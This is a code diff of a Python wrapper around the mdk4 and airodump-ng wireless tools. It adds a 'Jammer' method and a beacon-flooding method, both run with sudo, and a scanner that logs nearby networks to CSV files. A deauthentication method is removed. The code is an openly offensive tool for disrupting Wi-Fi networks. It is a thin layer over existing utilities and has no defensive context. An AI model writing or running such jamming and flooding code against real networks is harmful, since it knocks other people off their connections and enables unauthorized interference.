@@ -9,14 +9,37 @@ class mdk4:
         self.bssid = bssid
         self.interface = interface
 
-    def beacon_flooding(self):
+    def Jammer(self):
         clrscr()
-        typewriter.yellow("beacon is flooding!")
-        subprocess.run(["sudo", "mdk4", self.interface, self.mode, "-s", self.count])
+        typewriter.yellow_bright("Jammer Started!\n\n")
+        subprocess.run(["sudo", "mdk4", self.interface, self.mode])
 
-            
-    
-    def Deauther(self):
+    def Beacon_Flooding(self):
         clrscr()
-        typewriter.yellow("Deauther started!")
-        subprocess.run(["sudo", "mdk4", self.interface, self.mode, "-B", self.bssid])
+        typewriter.yellow_bright("Beacon Is Flooding!\n\n")
+        subprocess.run(["sudo", "mdk4", self.interface, self.mode])
+
+def airmon_scan(interface: str = None):
+    clrscr()
+    typewriter.yellow_bright("Scanner Started!\n\n")
+
+    if not os.path.exists("Saves"):
+        os.makedirs("Saves")
+
+    extensions = ["csv", "kismet.csv", "netxml", "log.csv"]
+
+    for ext in extensions:
+        file = f"Saves/networks-{ext}" if ext != "csv" else "Saves/networks-01.csv"
+        if os.path.exists(file):
+            os.remove(file)
+
+    try:
+        subprocess.run([
+            "sudo", "airodump-ng", interface,
+            "--write", "Saves/networks",
+            "--write-interval", "1",
+            "--output-format", "csv"
+        ])
+    except KeyboardInterrupt:
+        typewriter.yellow_bright("\nScan Stopped!")
+        return
